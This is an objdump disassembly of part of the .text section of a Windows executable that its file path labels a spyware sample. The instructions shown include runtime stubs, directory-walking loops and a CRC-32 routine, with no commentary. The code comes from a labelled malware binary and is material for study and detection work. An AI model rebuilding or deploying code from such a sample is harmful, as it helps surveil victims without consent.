
malware_samples/spyware/e245603d93bc6a65e4ffe1a4ce8f9c0a9d500fa2fc0ceea85de8216a0b4b140d.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	b9 d0 3e 43 00       	mov    $0x433ed0,%ecx
  401005:	e9 5a 05 00 00       	jmp    0x401564
  40100a:	68 83 65 42 00       	push   $0x426583
  40100f:	e8 8a 1e 01 00       	call   0x412e9e
  401014:	59                   	pop    %ecx
  401015:	c3                   	ret
  401016:	e8 a5 57 00 00       	call   0x4067c0
  40101b:	a3 50 b1 43 00       	mov    %eax,0x43b150
  401020:	c3                   	ret
  401021:	b9 60 b1 43 00       	mov    $0x43b160,%ecx
  401026:	e9 db 65 00 00       	jmp    0x407606
  40102b:	b9 90 b6 43 00       	mov    $0x43b690,%ecx
  401030:	e8 d8 c4 00 00       	call   0x40d50d
  401035:	68 8d 65 42 00       	push   $0x42658d
  40103a:	e8 5f 1e 01 00       	call   0x412e9e
  40103f:	59                   	pop    %ecx
  401040:	c3                   	ret
  401041:	b9 48 b2 45 00       	mov    $0x45b248,%ecx
  401046:	e8 09 45 00 00       	call   0x405554
  40104b:	68 97 65 42 00       	push   $0x426597
  401050:	e8 49 1e 01 00       	call   0x412e9e
  401055:	59                   	pop    %ecx
  401056:	c3                   	ret
  401057:	b9 d4 0c 45 00       	mov    $0x450cd4,%ecx
  40105c:	e9 e1 06 00 00       	jmp    0x401742
  401061:	b9 e8 0c 45 00       	mov    $0x450ce8,%ecx
  401066:	e8 c6 26 00 00       	call   0x403731
  40106b:	68 a1 65 42 00       	push   $0x4265a1
  401070:	e8 29 1e 01 00       	call   0x412e9e
  401075:	59                   	pop    %ecx
  401076:	c3                   	ret
  401077:	b9 52 23 46 00       	mov    $0x462352,%ecx
  40107c:	e8 d3 44 00 00       	call   0x405554
  401081:	68 ab 65 42 00       	push   $0x4265ab
  401086:	e8 13 1e 01 00       	call   0x412e9e
  40108b:	59                   	pop    %ecx
  40108c:	c3                   	ret
  40108d:	b9 d2 0b 45 00       	mov    $0x450bd2,%ecx
  401092:	e8 bd 44 00 00       	call   0x405554
  401097:	68 b5 65 42 00       	push   $0x4265b5
  40109c:	e8 fd 1d 01 00       	call   0x412e9e
  4010a1:	59                   	pop    %ecx
  4010a2:	c3                   	ret
  4010a3:	b9 50 0d 45 00       	mov    $0x450d50,%ecx
  4010a8:	e8 48 01 00 00       	call   0x4011f5
  4010ad:	68 bf 65 42 00       	push   $0x4265bf
  4010b2:	e8 e7 1d 01 00       	call   0x412e9e
  4010b7:	59                   	pop    %ecx
  4010b8:	c3                   	ret
  4010b9:	cc                   	int3
  4010ba:	cc                   	int3
  4010bb:	cc                   	int3
  4010bc:	cc                   	int3
  4010bd:	cc                   	int3
  4010be:	cc                   	int3
  4010bf:	cc                   	int3
  4010c0:	55                   	push   %ebp
  4010c1:	8b ec                	mov    %esp,%ebp
  4010c3:	81 ec 2c 02 00 00    	sub    $0x22c,%esp
  4010c9:	8d 45 fc             	lea    -0x4(%ebp),%eax
  4010cc:	50                   	push   %eax
  4010cd:	ff 15 cc 1d 43 00    	call   *0x431dcc
  4010d3:	85 c0                	test   %eax,%eax
  4010d5:	74 04                	je     0x4010db
  4010d7:	32 c0                	xor    %al,%al
  4010d9:	eb 5c                	jmp    0x401137
  4010db:	8b 45 08             	mov    0x8(%ebp),%eax
  4010de:	33 c9                	xor    %ecx,%ecx
  4010e0:	89 45 dc             	mov    %eax,-0x24(%ebp)
  4010e3:	8d 85 d4 fd ff ff    	lea    -0x22c(%ebp),%eax
  4010e9:	89 45 e4             	mov    %eax,-0x1c(%ebp)
  4010ec:	8b 45 0c             	mov    0xc(%ebp),%eax
  4010ef:	89 45 e8             	mov    %eax,-0x18(%ebp)
  4010f2:	8d 45 dc             	lea    -0x24(%ebp),%eax
  4010f5:	57                   	push   %edi
  4010f6:	50                   	push   %eax
  4010f7:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  4010fa:	c7 45 ec 41 00 00 00 	movl   $0x41,-0x14(%ebp)
  401101:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  401104:	89 4d f4             	mov    %ecx,-0xc(%ebp)
  401107:	ff 15 d0 1d 43 00    	call   *0x431dd0
  40110d:	8b f8                	mov    %eax,%edi
  40110f:	85 ff                	test   %edi,%edi
  401111:	75 04                	jne    0x401117
  401113:	32 c0                	xor    %al,%al
  401115:	eb 1f                	jmp    0x401136
  401117:	56                   	push   %esi
  401118:	ff 75 10             	push   0x10(%ebp)
  40111b:	57                   	push   %edi
  40111c:	ff 15 d4 1d 43 00    	call   *0x431dd4
  401122:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  401125:	8b f0                	mov    %eax,%esi
  401127:	57                   	push   %edi
  401128:	51                   	push   %ecx
  401129:	8b 11                	mov    (%ecx),%edx
  40112b:	ff 52 14             	call   *0x14(%edx)
  40112e:	33 c0                	xor    %eax,%eax
  401130:	85 f6                	test   %esi,%esi
  401132:	5e                   	pop    %esi
  401133:	0f 95 c0             	setne  %al
  401136:	5f                   	pop    %edi
  401137:	8b e5                	mov    %ebp,%esp
  401139:	5d                   	pop    %ebp
  40113a:	c2 0c 00             	ret    $0xc
  40113d:	0f b6 44 24 0c       	movzbl 0xc(%esp),%eax
  401142:	50                   	push   %eax
  401143:	ff 74 24 0c          	push   0xc(%esp)
  401147:	ff 74 24 0c          	push   0xc(%esp)
  40114b:	ff 15 a4 1e 43 00    	call   *0x431ea4
  401151:	50                   	push   %eax
  401152:	ff 15 a0 1e 43 00    	call   *0x431ea0
  401158:	c2 0c 00             	ret    $0xc
  40115b:	0f b6 44 24 0c       	movzbl 0xc(%esp),%eax
  401160:	f7 d8                	neg    %eax
  401162:	1b c0                	sbb    %eax,%eax
  401164:	83 e0 09             	and    $0x9,%eax
  401167:	50                   	push   %eax
  401168:	ff 74 24 0c          	push   0xc(%esp)
  40116c:	ff 74 24 0c          	push   0xc(%esp)
  401170:	ff 15 a4 1e 43 00    	call   *0x431ea4
  401176:	50                   	push   %eax
  401177:	ff 15 ac 1e 43 00    	call   *0x431eac
  40117d:	c2 0c 00             	ret    $0xc
  401180:	55                   	push   %ebp
  401181:	8b ec                	mov    %esp,%ebp
  401183:	83 7d 0c 30          	cmpl   $0x30,0xc(%ebp)
  401187:	74 59                	je     0x4011e2
  401189:	81 7d 0c 10 01 00 00 	cmpl   $0x110,0xc(%ebp)
  401190:	75 5d                	jne    0x4011ef
  401192:	8a 45 20             	mov    0x20(%ebp),%al
  401195:	b9 e8 0c 45 00       	mov    $0x450ce8,%ecx
  40119a:	24 01                	and    $0x1,%al
  40119c:	0f b6 c0             	movzbl %al,%eax
  40119f:	50                   	push   %eax
  4011a0:	ff 75 18             	push   0x18(%ebp)
  4011a3:	ff 75 08             	push   0x8(%ebp)
  4011a6:	e8 41 34 00 00       	call   0x4045ec
  4011ab:	f6 45 20 01          	testb  $0x1,0x20(%ebp)
  4011af:	74 3e                	je     0x4011ef
  4011b1:	ff 75 08             	push   0x8(%ebp)
  4011b4:	ff 15 98 1e 43 00    	call   *0x431e98
  4011ba:	85 c0                	test   %eax,%eax
  4011bc:	74 31                	je     0x4011ef
  4011be:	68 21 30 00 00       	push   $0x3021
  4011c3:	50                   	push   %eax
  4011c4:	ff 15 a4 1e 43 00    	call   *0x431ea4
  4011ca:	85 c0                	test   %eax,%eax
  4011cc:	74 21                	je     0x4011ef
  4011ce:	f6 45 20 08          	testb  $0x8,0x20(%ebp)
  4011d2:	74 1b                	je     0x4011ef
  4011d4:	68 a4 72 42 00       	push   $0x4272a4
  4011d9:	50                   	push   %eax
  4011da:	ff 15 9c 1e 43 00    	call   *0x431e9c
  4011e0:	eb 0d                	jmp    0x4011ef
  4011e2:	ff 75 08             	push   0x8(%ebp)
  4011e5:	b9 e8 0c 45 00       	mov    $0x450ce8,%ecx
  4011ea:	e8 d6 33 00 00       	call   0x4045c5
  4011ef:	32 c0                	xor    %al,%al
  4011f1:	5d                   	pop    %ebp
  4011f2:	c2 1c 00             	ret    $0x1c
  4011f5:	b8 65 64 42 00       	mov    $0x426465,%eax
  4011fa:	e8 a5 19 01 00       	call   0x412ba4
  4011ff:	51                   	push   %ecx
  401200:	56                   	push   %esi
  401201:	8b f1                	mov    %ecx,%esi
  401203:	89 75 f0             	mov    %esi,-0x10(%ebp)
  401206:	e8 b0 1b 00 00       	call   0x402dbb
  40120b:	83 65 fc 00          	andl   $0x0,-0x4(%ebp)
  40120f:	8d 8e 14 a3 00 00    	lea    0xa314(%esi),%ecx
  401215:	e8 f6 53 00 00       	call   0x406610
  40121a:	8d 8e 74 a3 00 00    	lea    0xa374(%esi),%ecx
  401220:	c6 45 fc 01          	movb   $0x1,-0x4(%ebp)
  401224:	e8 e7 53 00 00       	call   0x406610
  401229:	8d 8e d4 a3 00 00    	lea    0xa3d4(%esi),%ecx
  40122f:	c6 45 fc 02          	movb   $0x2,-0x4(%ebp)
  401233:	e8 d8 53 00 00       	call   0x406610
  401238:	8d 8e 34 a4 00 00    	lea    0xa434(%esi),%ecx
  40123e:	c6 45 fc 03          	movb   $0x3,-0x4(%ebp)
  401242:	e8 c9 53 00 00       	call   0x406610
  401247:	8d 8e 94 a4 00 00    	lea    0xa494(%esi),%ecx
  40124d:	c6 45 fc 04          	movb   $0x4,-0x4(%ebp)
  401251:	e8 ba 53 00 00       	call   0x406610
  401256:	8b ce                	mov    %esi,%ecx
  401258:	c6 45 fc 05          	movb   $0x5,-0x4(%ebp)
  40125c:	e8 c8 01 00 00       	call   0x401429
  401261:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  401264:	8b c6                	mov    %esi,%eax
  401266:	5e                   	pop    %esi
  401267:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  40126e:	8b e5                	mov    %ebp,%esp
  401270:	5d                   	pop    %ebp
  401271:	c3                   	ret
  401272:	55                   	push   %ebp
  401273:	8b ec                	mov    %esp,%ebp
  401275:	64 a1 00 00 00 00    	mov    %fs:0x0,%eax
  40127b:	6a ff                	push   $0xffffffff
  40127d:	68 96 64 42 00       	push   $0x426496
  401282:	50                   	push   %eax
  401283:	64 89 25 00 00 00 00 	mov    %esp,%fs:0x0
  40128a:	56                   	push   %esi
  40128b:	8b f1                	mov    %ecx,%esi
  40128d:	83 3e 00             	cmpl   $0x0,(%esi)
  401290:	74 1b                	je     0x4012ad
  401292:	80 7e 10 00          	cmpb   $0x0,0x10(%esi)
  401296:	74 0d                	je     0x4012a5
  401298:	8b 46 08             	mov    0x8(%esi),%eax
  40129b:	03 c0                	add    %eax,%eax
  40129d:	50                   	push   %eax
  40129e:	ff 36                	push   (%esi)
  4012a0:	e8 a8 44 00 00       	call   0x40574d
  4012a5:	ff 36                	push   (%esi)
  4012a7:	e8 c2 6b 01 00       	call   0x417e6e
  4012ac:	59                   	pop    %ecx
  4012ad:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4012b0:	64 89 0d 00 00 00 00 	mov    %ecx,%fs:0x0
  4012b7:	5e                   	pop    %esi
  4012b8:	8b e5                	mov    %ebp,%esp
  4012ba:	5d                   	pop    %ebp
  4012bb:	c3                   	ret
  4012bc:	e9 b1 ff ff ff       	jmp    0x401272
  4012c1:	81 c1 34 a4 00 00    	add    $0xa434,%ecx
  4012c7:	e9 26 54 00 00       	jmp    0x4066f2
  4012cc:	b8 04 20 00 00       	mov    $0x2004,%eax
  4012d1:	e8 fa 18 01 00       	call   0x412bd0
  4012d6:	53                   	push   %ebx
  4012d7:	55                   	push   %ebp
  4012d8:	56                   	push   %esi
  4012d9:	57                   	push   %edi
  4012da:	6a 00                	push   $0x0
  4012dc:	6a 00                	push   $0x0
  4012de:	ff b4 24 28 20 00 00 	push   0x2028(%esp)
  4012e5:	e8 e7 1c 00 00       	call   0x402fd1
  4012ea:	8b 8c 24 18 20 00 00 	mov    0x2018(%esp),%ecx
  4012f1:	8b d8                	mov    %eax,%ebx
  4012f3:	e8 c3 54 00 00       	call   0x4067bb
  4012f8:	bd 00 08 00 00       	mov    $0x800,%ebp
  4012fd:	e9 a2 00 00 00       	jmp    0x4013a4
  401302:	8d 44 24 10          	lea    0x10(%esp),%eax
  401306:	50                   	push   %eax
  401307:	e8 cb 22 00 00       	call   0x4035d7
  40130c:	8b f0                	mov    %eax,%esi
  40130e:	0f b7 0e             	movzwl (%esi),%ecx
  401311:	51                   	push   %ecx
  401312:	e8 a2 21 00 00       	call   0x4034b9
  401317:	80 bc 24 1c 20 00 00 	cmpb   $0x0,0x201c(%esp)
  40131e:	00 
  40131f:	74 0b                	je     0x40132c
  401321:	84 c0                	test   %al,%al
  401323:	74 1b                	je     0x401340
  401325:	33 c0                	xor    %eax,%eax
  401327:	66 89 06             	mov    %ax,(%esi)
  40132a:	eb 14                	jmp    0x401340
  40132c:	84 c0                	test   %al,%al
  40132e:	74 10                	je     0x401340
  401330:	55                   	push   %ebp
  401331:	68 a0 72 42 00       	push   $0x4272a0
  401336:	8d 44 24 18          	lea    0x18(%esp),%eax
  40133a:	50                   	push   %eax
  40133b:	e8 73 52 00 00       	call   0x4065b3
  401340:	6a 00                	push   $0x0
  401342:	6a 00                	push   $0x0
  401344:	8d 44 24 18          	lea    0x18(%esp),%eax
  401348:	8b fb                	mov    %ebx,%edi
  40134a:	50                   	push   %eax
  40134b:	e8 81 1c 00 00       	call   0x402fd1
  401350:	8b f0                	mov    %eax,%esi
  401352:	66 83 3e 2a          	cmpw   $0x2a,(%esi)
  401356:	75 3a                	jne    0x401392
  401358:	0f b7 4e 02          	movzwl 0x2(%esi),%ecx
  40135c:	51                   	push   %ecx
  40135d:	e8 57 21 00 00       	call   0x4034b9
  401362:	84 c0                	test   %al,%al
  401364:	74 2c                	je     0x401392
  401366:	6a 2e                	push   $0x2e
  401368:	58                   	pop    %eax
  401369:	6a 5c                	push   $0x5c
  40136b:	66 89 84 24 14 10 00 	mov    %ax,0x1014(%esp)
  401372:	00 
  401373:	58                   	pop    %eax
  401374:	55                   	push   %ebp
  401375:	66 89 84 24 16 10 00 	mov    %ax,0x1016(%esp)
  40137c:	00 
  40137d:	8d 84 24 18 10 00 00 	lea    0x1018(%esp),%eax
  401384:	53                   	push   %ebx
  401385:	50                   	push   %eax
  401386:	e8 50 52 00 00       	call   0x4065db
  40138b:	8d bc 24 10 10 00 00 	lea    0x1010(%esp),%edi
  401392:	ff b4 24 28 20 00 00 	push   0x2028(%esp)
  401399:	57                   	push   %edi
  40139a:	56                   	push   %esi
  40139b:	e8 05 17 00 00       	call   0x402aa5
  4013a0:	84 c0                	test   %al,%al
  4013a2:	75 27                	jne    0x4013cb
  4013a4:	8b 8c 24 18 20 00 00 	mov    0x2018(%esp),%ecx
  4013ab:	8d 44 24 10          	lea    0x10(%esp),%eax
  4013af:	55                   	push   %ebp
  4013b0:	50                   	push   %eax
  4013b1:	e8 c8 53 00 00       	call   0x40677e
  4013b6:	84 c0                	test   %al,%al
  4013b8:	0f 85 44 ff ff ff    	jne    0x401302
  4013be:	5f                   	pop    %edi
  4013bf:	5e                   	pop    %esi
  4013c0:	5d                   	pop    %ebp
  4013c1:	5b                   	pop    %ebx
  4013c2:	81 c4 04 20 00 00    	add    $0x2004,%esp
  4013c8:	c2 14 00             	ret    $0x14
  4013cb:	b0 01                	mov    $0x1,%al
  4013cd:	eb ef                	jmp    0x4013be
  4013cf:	55                   	push   %ebp
  4013d0:	8b ec                	mov    %esp,%ebp
  4013d2:	56                   	push   %esi
  4013d3:	6a 06                	push   $0x6
  4013d5:	ff 75 10             	push   0x10(%ebp)
  4013d8:	8b f1                	mov    %ecx,%esi
  4013da:	ff 75 08             	push   0x8(%ebp)
  4013dd:	ff 75 0c             	push   0xc(%ebp)
  4013e0:	8d 86 74 a3 00 00    	lea    0xa374(%esi),%eax
  4013e6:	50                   	push   %eax
  4013e7:	e8 e0 fe ff ff       	call   0x4012cc
  4013ec:	84 c0                	test   %al,%al
  4013ee:	74 04                	je     0x4013f4
  4013f0:	b0 01                	mov    $0x1,%al
  4013f2:	eb 30                	jmp    0x401424
  4013f4:	80 7d 14 00          	cmpb   $0x0,0x14(%ebp)
  4013f8:	74 28                	je     0x401422
  4013fa:	83 be ec a3 00 00 00 	cmpl   $0x0,0xa3ec(%esi)
  401401:	74 1f                	je     0x401422
  401403:	6a 06                	push   $0x6
  401405:	ff 75 10             	push   0x10(%ebp)
  401408:	8d 86 d4 a3 00 00    	lea    0xa3d4(%esi),%eax
  40140e:	ff 75 08             	push   0x8(%ebp)
  401411:	ff 75 0c             	push   0xc(%ebp)
  401414:	50                   	push   %eax
  401415:	e8 b2 fe ff ff       	call   0x4012cc
  40141a:	f6 d8                	neg    %al
  40141c:	1a c0                	sbb    %al,%al
  40141e:	fe c0                	inc    %al
  401420:	eb 02                	jmp    0x401424
  401422:	32 c0                	xor    %al,%al
  401424:	5e                   	pop    %esi
  401425:	5d                   	pop    %ebp
  401426:	c2 10 00             	ret    $0x10
  401429:	56                   	push   %esi
  40142a:	8b f1                	mov    %ecx,%esi
  40142c:	e8 3b 1a 00 00       	call   0x402e6c
  401431:	33 c0                	xor    %eax,%eax
  401433:	8d 8e 14 a3 00 00    	lea    0xa314(%esi),%ecx
  401439:	66 89 86 f2 82 00 00 	mov    %ax,0x82f2(%esi)
  401440:	66 89 86 12 93 00 00 	mov    %ax,0x9312(%esi)
  401447:	66 89 86 e8 82 00 00 	mov    %ax,0x82e8(%esi)
  40144e:	89 86 ec 82 00 00    	mov    %eax,0x82ec(%esi)
  401454:	88 86 f0 82 00 00    	mov    %al,0x82f0(%esi)
  40145a:	e8 46 53 00 00       	call   0x4067a5
  40145f:	8d 8e 74 a3 00 00    	lea    0xa374(%esi),%ecx
  401465:	e8 3b 53 00 00       	call   0x4067a5
  40146a:	8d 8e d4 a3 00 00    	lea    0xa3d4(%esi),%ecx
  401470:	e8 30 53 00 00       	call   0x4067a5
  401475:	8d 8e 94 a4 00 00    	lea    0xa494(%esi),%ecx
  40147b:	e8 25 53 00 00       	call   0x4067a5
  401480:	8d 8e 34 a4 00 00    	lea    0xa434(%esi),%ecx
  401486:	e8 1a 53 00 00       	call   0x4067a5
  40148b:	8d 8e 68 61 00 00    	lea    0x6168(%esi),%ecx
  401491:	5e                   	pop    %esi
  401492:	e9 b0 00 00 00       	jmp    0x401547
  401497:	53                   	push   %ebx
  401498:	55                   	push   %ebp
  401499:	56                   	push   %esi
  40149a:	8b 74 24 20          	mov    0x20(%esp),%esi
  40149e:	57                   	push   %edi
  40149f:	8b f9                	mov    %ecx,%edi
  4014a1:	85 f6                	test   %esi,%esi
  4014a3:	74 0c                	je     0x4014b1
  4014a5:	83 7c 24 28 00       	cmpl   $0x0,0x28(%esp)
  4014aa:	76 05                	jbe    0x4014b1
  4014ac:	33 c0                	xor    %eax,%eax
  4014ae:	66 89 06             	mov    %ax,(%esi)
  4014b1:	8b 4c 24 14          	mov    0x14(%esp),%ecx
  4014b5:	33 db                	xor    %ebx,%ebx
  4014b7:	43                   	inc    %ebx
  4014b8:	53                   	push   %ebx
  4014b9:	6a 00                	push   $0x0
  4014bb:	8a 81 f1 10 00 00    	mov    0x10f1(%ecx),%al
  4014c1:	8d 69 28             	lea    0x28(%ecx),%ebp
  4014c4:	88 44 24 2c          	mov    %al,0x2c(%esp)
  4014c8:	8b cf                	mov    %edi,%ecx
  4014ca:	ff 74 24 2c          	push   0x2c(%esp)
  4014ce:	89 6c 24 20          	mov    %ebp,0x20(%esp)
  4014d2:	55                   	push   %ebp
  4014d3:	e8 f7 fe ff ff       	call   0x4013cf
  4014d8:	84 c0                	test   %al,%al
  4014da:	75 34                	jne    0x401510
  4014dc:	81 c7 14 a3 00 00    	add    $0xa314,%edi
  4014e2:	8b cf                	mov    %edi,%ecx
  4014e4:	89 7c 24 24          	mov    %edi,0x24(%esp)
  4014e8:	e8 ce 52 00 00       	call   0x4067bb
  4014ed:	8b cf                	mov    %edi,%ecx
  4014ef:	eb 14                	jmp    0x401505
  4014f1:	ff 74 24 1c          	push   0x1c(%esp)
  4014f5:	55                   	push   %ebp
  4014f6:	57                   	push   %edi
  4014f7:	e8 a9 15 00 00       	call   0x402aa5
  4014fc:	84 c0                	test   %al,%al
  4014fe:	75 19                	jne    0x401519
  401500:	8b 4c 24 24          	mov    0x24(%esp),%ecx
  401504:	43                   	inc    %ebx
  401505:	e8 24 52 00 00       	call   0x40672e
  40150a:	8b f8                	mov    %eax,%edi
  40150c:	85 ff                	test   %edi,%edi
  40150e:	75 e1                	jne    0x4014f1
  401510:	33 c0                	xor    %eax,%eax
  401512:	5f                   	pop    %edi
  401513:	5e                   	pop    %esi
  401514:	5d                   	pop    %ebp
  401515:	5b                   	pop    %ebx
  401516:	c2 18 00             	ret    $0x18
  401519:	8b 6c 24 18          	mov    0x18(%esp),%ebp
  40151d:	85 ed                	test   %ebp,%ebp
  40151f:	74 13                	je     0x401534
  401521:	ff 74 24 14          	push   0x14(%esp)
  401525:	57                   	push   %edi
  401526:	e8 83 50 00 00       	call   0x4065ae
  40152b:	f7 d8                	neg    %eax
  40152d:	1a c0                	sbb    %al,%al
  40152f:	fe c0                	inc    %al
  401531:	88 45 00             	mov    %al,0x0(%ebp)
  401534:	85 f6                	test   %esi,%esi
  401536:	74 0b                	je     0x401543
  401538:	ff 74 24 28          	push   0x28(%esp)
  40153c:	57                   	push   %edi
  40153d:	56                   	push   %esi
  40153e:	e8 98 50 00 00       	call   0x4065db
  401543:	8b c3                	mov    %ebx,%eax
  401545:	eb cb                	jmp    0x401512
  401547:	56                   	push   %esi
  401548:	8b f1                	mov    %ecx,%esi
  40154a:	83 3e 00             	cmpl   $0x0,(%esi)
  40154d:	74 0b                	je     0x40155a
  40154f:	ff 36                	push   (%esi)
  401551:	e8 18 69 01 00       	call   0x417e6e
  401556:	83 26 00             	andl   $0x0,(%esi)
  401559:	59                   	pop    %ecx
  40155a:	83 66 04 00          	andl   $0x0,0x4(%esi)
  40155e:	83 66 08 00          	andl   $0x0,0x8(%esi)
  401562:	5e                   	pop    %esi
  401563:	c3                   	ret
  401564:	53                   	push   %ebx
  401565:	55                   	push   %ebp
  401566:	56                   	push   %esi
  401567:	57                   	push   %edi
  401568:	68 d0 1e 43 00       	push   $0x431ed0
  40156d:	8b d9                	mov    %ecx,%ebx
  40156f:	e8 24 01 00 00       	call   0x401698
  401574:	ba d0 22 43 00       	mov    $0x4322d0,%edx
  401579:	be 00 01 00 00       	mov    $0x100,%esi
  40157e:	8b 8a 00 fc ff ff    	mov    -0x400(%edx),%ecx
  401584:	8b fa                	mov    %edx,%edi
  401586:	6a 07                	push   $0x7
  401588:	5d                   	pop    %ebp
  401589:	0f b6 c1             	movzbl %cl,%eax
  40158c:	c1 e9 08             	shr    $0x8,%ecx
  40158f:	33 0c 85 d0 1e 43 00 	xor    0x431ed0(,%eax,4),%ecx
  401596:	89 0f                	mov    %ecx,(%edi)
  401598:	8d bf 00 04 00 00    	lea    0x400(%edi),%edi
  40159e:	83 ed 01             	sub    $0x1,%ebp
  4015a1:	75 e6                	jne    0x401589
  4015a3:	83 c2 04             	add    $0x4,%edx
  4015a6:	83 ee 01             	sub    $0x1,%esi
  4015a9:	75 d3                	jne    0x40157e
  4015ab:	5f                   	pop    %edi
  4015ac:	5e                   	pop    %esi
  4015ad:	5d                   	pop    %ebp
  4015ae:	8b c3                	mov    %ebx,%eax
  4015b0:	5b                   	pop    %ebx
  4015b1:	c3                   	ret
  4015b2:	55                   	push   %ebp
  4015b3:	8b ec                	mov    %esp,%ebp
  4015b5:	8b 55 0c             	mov    0xc(%ebp),%edx
  4015b8:	53                   	push   %ebx
  4015b9:	8b 5d 08             	mov    0x8(%ebp),%ebx
  4015bc:	56                   	push   %esi
  4015bd:	8b 75 10             	mov    0x10(%ebp),%esi
  4015c0:	85 f6                	test   %esi,%esi
  4015c2:	74 20                	je     0x4015e4
  4015c4:	f6 c2 07             	test   $0x7,%dl
  4015c7:	74 1b                	je     0x4015e4
  4015c9:	0f b6 0a             	movzbl (%edx),%ecx
  4015cc:	0f b6 c3             	movzbl %bl,%eax
  4015cf:	33 c8                	xor    %eax,%ecx
  4015d1:	c1 eb 08             	shr    $0x8,%ebx
  4015d4:	33 1c 8d d0 1e 43 00 	xor    0x431ed0(,%ecx,4),%ebx
  4015db:	42                   	inc    %edx
  4015dc:	89 55 0c             	mov    %edx,0xc(%ebp)
  4015df:	83 ee 01             	sub    $0x1,%esi
  4015e2:	75 e0                	jne    0x4015c4
  4015e4:	83 fe 08             	cmp    $0x8,%esi
  4015e7:	0f 82 87 00 00 00    	jb     0x401674
  4015ed:	57                   	push   %edi
  4015ee:	8b fe                	mov    %esi,%edi
  4015f0:	c1 ef 03             	shr    $0x3,%edi
  4015f3:	33 1a                	xor    (%edx),%ebx
  4015f5:	83 ee 08             	sub    $0x8,%esi
  4015f8:	8b 52 04             	mov    0x4(%edx),%edx
  4015fb:	8b ca                	mov    %edx,%ecx
  4015fd:	c1 e9 18             	shr    $0x18,%ecx
  401600:	8b c2                	mov    %edx,%eax
  401602:	c1 e8 10             	shr    $0x10,%eax
  401605:	0f b6 c0             	movzbl %al,%eax
  401608:	8b 0c 8d d0 1e 43 00 	mov    0x431ed0(,%ecx,4),%ecx
  40160f:	33 0c 85 d0 22 43 00 	xor    0x4322d0(,%eax,4),%ecx
  401616:	8b c2                	mov    %edx,%eax
  401618:	c1 e8 08             	shr    $0x8,%eax
  40161b:	0f b6 c0             	movzbl %al,%eax
  40161e:	33 0c 85 d0 26 43 00 	xor    0x4326d0(,%eax,4),%ecx
  401625:	8b c3                	mov    %ebx,%eax
  401627:	c1 e8 18             	shr    $0x18,%eax
  40162a:	33 0c 85 d0 2e 43 00 	xor    0x432ed0(,%eax,4),%ecx
  401631:	8b c3                	mov    %ebx,%eax
  401633:	c1 e8 10             	shr    $0x10,%eax
  401636:	0f b6 c0             	movzbl %al,%eax
  401639:	33 0c 85 d0 32 43 00 	xor    0x4332d0(,%eax,4),%ecx
  401640:	8b c3                	mov    %ebx,%eax
  401642:	c1 e8 08             	shr    $0x8,%eax
  401645:	0f b6 c0             	movzbl %al,%eax
  401648:	33 0c 85 d0 36 43 00 	xor    0x4336d0(,%eax,4),%ecx
  40164f:	0f b6 c2             	movzbl %dl,%eax
  401652:	8b 55 0c             	mov    0xc(%ebp),%edx
  401655:	83 c2 08             	add    $0x8,%edx
  401658:	89 55 0c             	mov    %edx,0xc(%ebp)
  40165b:	33 0c 85 d0 2a 43 00 	xor    0x432ad0(,%eax,4),%ecx
  401662:	0f b6 c3             	movzbl %bl,%eax
  401665:	33 0c 85 d0 3a 43 00 	xor    0x433ad0(,%eax,4),%ecx
  40166c:	8b d9                	mov    %ecx,%ebx
  40166e:	83 ef 01             	sub    $0x1,%edi
  401671:	75 80                	jne    0x4015f3
  401673:	5f                   	pop    %edi
  401674:	85 f6                	test   %esi,%esi
  401676:	74 18                	je     0x401690
  401678:	0f b6 0a             	movzbl (%edx),%ecx
  40167b:	0f b6 c3             	movzbl %bl,%eax
  40167e:	33 c8                	xor    %eax,%ecx
  401680:	c1 eb 08             	shr    $0x8,%ebx
  401683:	33 1c 8d d0 1e 43 00 	xor    0x431ed0(,%ecx,4),%ebx
  40168a:	42                   	inc    %edx
  40168b:	83 ee 01             	sub    $0x1,%esi
  40168e:	75 e8                	jne    0x401678
  401690:	5e                   	pop    %esi
  401691:	8b c3                	mov    %ebx,%eax
  401693:	5b                   	pop    %ebx
  401694:	5d                   	pop    %ebp
  401695:	c2 0c 00             	ret    $0xc
  401698:	8b 54 24 04          	mov    0x4(%esp),%edx
  40169c:	33 c9                	xor    %ecx,%ecx
  40169e:	39 4a 04             	cmp    %ecx,0x4(%edx)
  4016a1:	75 27                	jne    0x4016ca
  4016a3:	56                   	push   %esi
  4016a4:	6a 08                	push   $0x8
  4016a6:	8b c1                	mov    %ecx,%eax
  4016a8:	5e                   	pop    %esi
  4016a9:	a8 01                	test   $0x1,%al
  4016ab:	74 09                	je     0x4016b6
  4016ad:	d1 e8                	shr    $1,%eax
  4016af:	35 20 83 b8 ed       	xor    $0xedb88320,%eax
  4016b4:	eb 02                	jmp    0x4016b8
  4016b6:	d1 e8                	shr    $1,%eax
  4016b8:	83 ee 01             	sub    $0x1,%esi
  4016bb:	75 ec                	jne    0x4016a9
  4016bd:	89 04 8a             	mov    %eax,(%edx,%ecx,4)
  4016c0:	41                   	inc    %ecx
  4016c1:	81 f9 00 01 00 00    	cmp    $0x100,%ecx
  4016c7:	72 db                	jb     0x4016a4
  4016c9:	5e                   	pop    %esi
  4016ca:	c2 04 00             	ret    $0x4
  4016cd:	55                   	push   %ebp
  4016ce:	8b ec                	mov    %esp,%ebp
  4016d0:	83 ec 4c             	sub    $0x4c,%esp
  4016d3:	ff 75 08             	push   0x8(%ebp)
  4016d6:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4016d9:	e8 7b 00 00 00       	call   0x401759
  4016de:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  4016e1:	83 f9 08             	cmp    $0x8,%ecx
  4016e4:	73 0a                	jae    0x4016f0
  4016e6:	8b 45 0c             	mov    0xc(%ebp),%eax
  4016e9:	89 44 8d b4          	mov    %eax,-0x4c(%ebp,%ecx,4)
  4016ed:	ff 45 f4             	incl   -0xc(%ebp)
  4016f0:	8d 4d b4             	lea    -0x4c(%ebp),%ecx
  4016f3:	e8 9b 59 00 00       	call   0x407093
  4016f8:	8b e5                	mov    %ebp,%esp
  4016fa:	5d                   	pop    %ebp
  4016fb:	c2 08 00             	ret    $0x8
  4016fe:	55                   	push   %ebp
  4016ff:	8b ec                	mov    %esp,%ebp
